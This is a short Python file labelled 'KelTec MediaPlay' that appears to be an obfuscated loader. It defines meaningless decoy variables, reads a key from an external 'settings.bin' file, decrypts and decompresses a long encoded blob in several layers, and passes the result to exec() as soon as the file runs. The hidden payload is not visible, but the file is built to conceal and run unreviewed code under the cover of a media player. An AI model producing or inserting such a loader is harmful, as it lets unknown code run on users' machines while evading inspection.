# -*- coding: utf-8 -*-
# KelTec MediaPlay 
_lx0_0 = 930435 ^ 558785
_lx1_1 = len("fca21f")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-323552)
_lx3_3 = 473088 * 0
_lx4_4 = 557494 ^ 253388
# _K carregada de arquivo externo
_M = 'ZWN4i3Sc72TA5cLZS/Q8UUN9Ix/WpSqK99Gr2C3HZIxuc3DMKMLhaJjmz9oUpz0CEXkqQYDzeo731fiNeZdo0WZxK50sluY5z+me'
_D = '==wGA/h7Pi0ACxM9kAH+LYMdlJvZPEUCi6NgjwXiKhHICHK3iTUKQelP1JSeUKpXUiDXElEnf0g3w0itL3yT9fWxIKKuiJ0aajfffyoqsFrYg4iLa8EsmTO8pfJUjz6v49iwrVs4xhbpZrh6oiemxe1ASb7hqrndFxbYJDd1swKzO3MfXVMxmvA5kJ7i43/l9owUx9wtEr6aClWIa3hSBAZUvlRViyP+TmA/tmZYkgJHAEvz20JKaYY9i6CksG+IEFAfq9h3wGghUxC5Ebjhm9Q2MyHZ9VvaTUbWV7aXfSW8/R4Dm+mGMhvq/ePn96Rp2ygFACSr0BXMS7H50mirO43J9mSH9etbPt2CvT36sIT2NAE333NxKAo/Napjd18Qgpjz3Ge4BmivYYXr7MnjquD1jtwCeVqm0eQRFUyZV+iB4VC4IENqd3xLxIHKVwYBZ8Hr6vuEYfk05EofAknMBgs5KVXydJ852lXN13SfXlGKoPPLceLv9YLk+mm5MpXnRWwiCoZiv5xrV8Su1aVorhtlaBvBIRl5fEjgrhrIlZnhwzjYmgWm9+PMWla63AnP88rxJSwtM5SKpN2Yy4TTmu3xSa3s9kqI4Cj20O2ZfpeHcJrmoK2KWlNtXUSveAWvqRN+zdz/PVoicBzd4XlCvRq7RfSSNJd5Vo1obsflzF+wH9lNA5y7owef/RFpiJKBDYzSa+L/r5ldk/UscjqkhMGZZby4KzlGpjyWr8N4799jVmdsyMQiQag5z75dKPYxyvfBvToGy+PK2pADcQ+jQ2OMHGFlKU2r944lLR4tbP6IW/Ge8vpz96QxfuZuhXgzsjmNY332fCU6V1oOJ2aKN6As7zwDdCXYnvBvVat6gmh2pVN9eHaoSNwsDKm8sHwgKYcwpRGGk+NwnrLUBGYco8Ij8zMMD3D6MRRb97qxnIQQn8dlH7WfTR5FfKPTOImRrbG0+ecfIxUTb8jAXaYgFnJmkq0eqOu5GRi3x+HyBshhoI0vKDTcDzg9PRzbfUgeQs2MO/3A40KfiAaFyvYb1Iqn3WtSHGUgreb8dPiz9Not97BdSzDA1pDNuK0cMMrKcmpvWz+e1bFUyZ9jMS2C3qGJi6PxAROcqkd5U+JlDNCqOoXfGhZcNuAH82oNgfzA4vd0RlozdYslcY4sw4ACCl4hu1bjYbGfwhg8ibDG4LndZ9vHXC8ybmFw5B6n3qwXPvIyU0+DLg36WOkBMJdVGBbcmgswi21zWTbRok1JP83uMq+eRSe9aqRTvdUVtiMnk+8AoEifZl5W1QRP9njT1kXJTK+if1qHSWRoB6rwpH/TsH5JWEP8CcCMk2cQXPkAXpDnS7Hy6F/PKXbJZr2syz23eCfZeXXkhONRp8bvIfalG3ZdT4MjXEUVnd0FUvUzebiOrKYMlewsJjj0fep+I2Ti2ZHtkJDOcyZPHlXNOEdk1tgY4dN31MKHTm4bTTZRhkQT00FkR7A84yuaFj4SKdW7TMSvVxC58aA2EV5kLwNWuKTVeu/65NhTFWfSWxgR'

_kf=_o.path.join(_o.path.dirname(_o.path.abspath(__file__)),'resources/data','settings.bin')
with open(_kf,'r') as _f:_K=_f.read().strip()
def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    exec(compile(src,'<mediaplay>','exec'),{'__name__':'__main__','__file__':__file__})
_run()